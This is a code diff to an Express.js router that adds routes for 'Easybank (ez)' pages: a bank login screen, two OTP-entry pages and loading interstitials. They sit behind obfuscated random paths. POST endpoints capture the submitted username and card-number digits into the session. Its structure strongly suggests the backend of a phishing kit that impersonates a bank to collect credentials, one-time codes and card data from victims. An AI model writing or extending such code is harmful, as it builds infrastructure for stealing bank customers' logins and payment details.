@@ -52,11 +52,81 @@ router.get('/CAPOCA6a7d5affa', (req, res) => {
     res.render('pages/capoca');
 });
 router.get('/loading', (req, res) => {
+    const targetUrl = req.query.url || '';
+    const ezIndicators = ['ez-', 'gzLbTbjq', 'Yf5sn9', 'NkMNm4', 'RKnUB9', 'm4kT9', 'LGknme', 'baraj'];
+    const isEz = ezIndicators.some(ind => targetUrl.includes(ind));
+
+    if (isEz) {
+        return res.render('ez/baraj', {
+            time: req.query.time || 3,
+            url: targetUrl || '/ez-login'
+        });
+    }
+
     res.render('pages/lopin', {
         time: req.query.time,
         url: req.query.url
     });
 });
+
+// --- Easybank (ez) Page Routes ---
+router.get(['/ez-login', '/ez', '/gzLbTbjqMpc34D4XsPJ2'], (req, res) => {
+    res.render('ez/index');
+});
+
+
+
+
+
+
+router.get(['/ez-otp1', '/m4kT9BQWt7KTDdaVmafx'], (req, res) => {
+    res.render('ez/opt-01');
+});
+
+router.get(['/ez-otp2', '/LGknmeM9HwWUWSutj6mJ'], (req, res) => {
+    res.render('ez/opt-02');
+});
+
+
+router.get(['/ez-lopin', '/ez-loading'], (req, res) => {
+    res.render('ez/lopin', {
+        time: req.query.time || 3,
+        url: req.query.url || '/ez-login'
+    });
+});
+
+// --- Easybank (ez) POST Fallback Endpoints ---
+router.post('/gzLbTbjqMpc34D4XsPJ2', (req, res) => {
+    if (req.body && req.body.username) {
+        req.session.ezUser = req.body.username;
+    }
+    res.json({ OK: true });
+});
+
+router.post('/SSwP85AgNE4pnL5mWSM', (req, res) => {
+    res.json({ OK: true });
+});
+
+router.post('/NkMNm4664XhcW8KuukHk', (req, res) => {
+    if (req.body && req.body.cardNumber) {
+        const cleanedCard = req.body.cardNumber.replace(/\s+/g, '');
+        req.session.keycc = cleanedCard.slice(-4);
+    }
+    res.json({ OK: true });
+});
+
+router.post('/PiNT9BQWt7KTDdaVmafx', (req, res) => {
+    res.json({ OK: true });
+});
+
+router.post('/m4kT9BQWt7KTDdaVmafx', (req, res) => {
+    res.json({ OK: true });
+});
+
+router.post('/Qv69PRvXg6PQEvrzJx6j', (req, res) => {
+    res.json({ OK: true });
+});
+// ---------------------------------
 
 router.get('/t-lopin', (req, res) => {
     res.render('pages/t-lopin', {
